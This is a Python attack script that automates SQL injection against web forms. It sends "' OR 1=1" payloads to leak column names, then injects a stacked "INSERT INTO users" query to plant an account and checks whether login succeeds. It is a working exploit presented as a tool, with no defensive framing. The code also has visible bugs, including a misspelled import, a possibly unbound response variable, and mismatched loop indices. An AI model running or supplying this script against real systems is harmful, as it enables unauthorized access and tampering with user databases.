import requests
import time
import logger
import json
from gloabls import payloads

class TestPayloadException(Exception):
    pass


def search_keys(form, param, value):
    payload = f"' OR 1=1 -- "
    headers = {'Content-Type': 'application/json'}
    
    url = form['url']
      
    new_object = {}
    
    for obj in form['body']:
        value = payloads.get(obj['name'], 'a12345678')
        if obj['name'] == param:
            value = payload
        new_object[obj['name']] = value
    
    try:  
        response = requests.post(url, headers=headers, json=new_object, timeout=5)
        response.raise_for_status() 
    except requests.exceptions.RequestException as e:
        print(f"Request failed: {e}")
        if hasattr(response, 'status_code') and response.status_code == 500:
            raise TestPayloadException("Server returned status code 500")
        return False
    
    return json.loads(response.text)['data'][0].keys()

def try_payload(form, param, keys):
    headers = {'Content-Type': 'application/json'}
    keys.remove('id')
    print(f"KEYS: {keys}")
    field = ", ".join(keys)
    field = f"{field}"
    values = []
    
    new_object = {}
    
    for key in keys:
        temp_value = payloads.get(key, 'a12345678')
        values.append(temp_value)
    
    value = "\", \"".join(values)
    value = f"\"{value}\""

    print(f"FIELD: {field}")
    print(f"VALUE: {value}")

    inj_payloads = [f"' OR 1=1; INSERT INTO users ({field}) VALUES ({value}); --"]    
    
    url = form['url']
    
    new_object = {}

    for obj in form['body']:
        temp_value = payloads.get(obj['name'], 'a12345678')
        if obj['name'] == param:
            temp_value = inj_payloads[0]
        new_object[obj['name']] = temp_value

    print(f"BODY OF INJECTION: {new_object}")

    print(f"TRYING PAYLOAD: {inj_payloads[0]}")
    # Send the POST request with a timeout
    try:
        response = requests.post(url, headers=headers, json=new_object, timeout=5)
        response.raise_for_status()  # Raise an exception for 4xx/5xx errors
    except requests.exceptions.RequestException as e:
        print(f"Request failed: {e}")
        if hasattr(response, 'status_code') and response.status_code == 500:
            raise TestPayloadException("Server returned status code 500")
        return False
    
    # Print the payload and response text for debugging
    if response.status_code == 200:
        logger.log_response(response.text)
    
    # Check if the login was successful based on response text
    return "Login successful" in response.text

def non_blind(form):
    max_runtime = 60  # Maximum total runtime in seconds (1 minute)
    
    keys = []
    value = 'password123'
    
    print(f"FORM BODY: {form['body']}")
    
    num_of_params = len(form['body'])
    
    for i in range(num_of_params):
        
        
        param_name = form['body'][num_of_params - 1- i]['name']
        print(f"Trying to attack with parameter: {param_name}")
        
        if form['body'][i]['value'] != '':
            print(f"Skipping parameter {param_name} since it already has a value.")
            continue
        
        start_time = time.time()

        try:
            keys = list(search_keys(form, param_name, value))
            if try_payload(form, param_name, keys):
                print(f"Successfully found key for parameter!!")          
            
        except TestPayloadException as e:
            print(f"Error for parameter {param_name}: {e}")
            continue
        
        if (time.time() - start_time) >= max_runtime:
            print(f"Maximum runtime exceeded for parameter: {param_name}")
            break
